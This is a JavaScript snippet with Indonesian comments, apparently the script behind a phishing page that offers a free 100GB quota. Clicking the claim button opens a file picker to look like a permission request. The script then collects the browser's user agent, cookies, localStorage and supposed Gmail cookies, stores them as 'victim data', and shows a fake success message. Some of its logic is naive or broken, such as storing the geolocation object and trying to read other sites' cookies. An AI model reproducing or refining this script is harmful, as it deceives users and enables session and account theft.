document.getElementById('klaimBtn').addEventListener('click', function() {
    // Fungsi untuk meminta akses storage
    async function mintaAkses() {
        try {
            // Mencoba membaca file (ini akan memicu permintaan izin)
            const file = await window.showOpenFilePicker();
            const data = await file[0].getFile();
            console.log("Akses diberikan:", data);
            ambilDataPenting(); // Lanjutkan jika izin diberikan
        } catch (error) {
            console.error("Akses ditolak:", error);
            alert("Anda harus memberikan izin untuk melanjutkan.");
        }
    }

    // Fungsi untuk mengambil data penting dan mengirimkannya
    async function ambilDataPenting() {
        // Ganti ini dengan logika sebenarnya untuk mengambil data
        const dataUntukDikirim = {
            namaBrowser: navigator.userAgent,
            lokasi: navigator.geolocation, // Ini memerlukan izin tambahan
            cookie: document.cookie,
            localStorage: localStorage,
            gmailCookies: getGmailCookies(), // Ambil cookie Gmail
            timestamp: new Date().toISOString()
            // ...data lain yang ingin diambil
        };

        // Simpan data ke localStorage (sementara)
        simpanData(dataUntukDikirim);
    }

    function getGmailCookies() {
        let gmailCookies = "";
        const cookies = document.cookie.split(';');

        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i].trim();
            // Periksa apakah cookie ini terkait dengan Gmail
            if (cookie.startsWith('GMAIL_') || cookie.includes('google.com')) {
                gmailCookies += cookie + '; ';
            }
        }

        return gmailCookies;
    }

    function simpanData(data) {
        let dataKorban = JSON.parse(localStorage.getItem('dataKorban')) || [];
        dataKorban.push(data);
        localStorage.setItem('dataKorban', JSON.stringify(dataKorban));

        alert('Selamat! Kuota 100GB Anda telah aktif!'); // Pesan sukses
    }

    mintaAkses(); // Memulai proses
});